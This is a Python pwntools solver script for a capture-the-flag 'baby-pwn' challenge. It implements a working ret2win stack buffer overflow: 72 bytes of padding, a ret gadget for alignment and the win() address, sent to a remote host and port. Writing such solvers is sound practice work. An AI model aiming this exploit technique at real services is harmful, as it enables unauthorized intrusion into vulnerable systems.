#!/usr/bin/env python3
"""
Baby-pwn solver
Classic ret2win buffer overflow.

Binary compiled with: -fno-stack-protector -no-pie -z execstack
Buffer is 64 bytes, so offset to return address = 64 (buf) + 8 (saved RBP) = 72

On Ubuntu 22.04, stack must be 16-byte aligned before a call instruction.
We use a 'ret' gadget to fix alignment before jumping to win().
"""
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8888

try:
    from pwn import *
    context.log_level = "info"

    if len(sys.argv) > 1:
        r = remote(HOST, PORT)
        # For remote, we need to find addresses from the distributed binary
        elf = ELF("./chall-dist/challenge", checksec=False)
    else:
        elf = ELF("./chall-dist/challenge", checksec=False)
        r = remote(HOST, PORT)

    win_addr = elf.symbols["win"]
    log.info(f"win() @ {hex(win_addr)}")

    # Find a 'ret' gadget for stack alignment
    rop = ROP(elf)
    ret_gadget = rop.find_gadget(["ret"])[0]
    log.info(f"ret gadget @ {hex(ret_gadget)}")

    # Payload: padding + ret (alignment) + win address
    offset = 72
    payload = b"A" * offset
    payload += p64(ret_gadget)
    payload += p64(win_addr)

    r.recvuntil(b"Enter your name: ")
    r.sendline(payload)
    print(r.recvall(timeout=3).decode())

except ImportError:
    print("[!] pwntools not installed. Install with: pip install pwntools")
    print("[*] Manual exploit: overflow 72 bytes + ret_gadget + win_address")
    sys.exit(1)
